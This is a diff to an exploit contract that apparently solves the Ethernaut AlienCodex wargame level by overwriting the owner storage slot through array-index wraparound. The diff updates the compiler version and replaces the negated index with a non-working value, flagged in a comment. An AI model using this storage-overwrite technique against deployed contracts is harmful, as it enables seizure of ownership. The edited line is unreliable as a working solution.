@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.5.0;
+pragma solidity ^0.8.17;
 
 interface IAlienCodex {
   function make_contact() external;
@@ -18,7 +18,7 @@ contract Solve {
     // Owner is located at storage 0, array is located at storage 1
     // keccak256(arraySlot) + targetIndex = 0
     // targetIndex = -keccak256(arraySlot)
-    uint256 ownerStorageSlot = -codexStart;
+    uint256 ownerStorageSlot = codexStart; // Must be changed to -codexStart
     require(ownerStorageSlot + codexStart == 0, "Not 0");
 
     bytes32 payload = bytes32(uint256(uint160(msg.sender)));
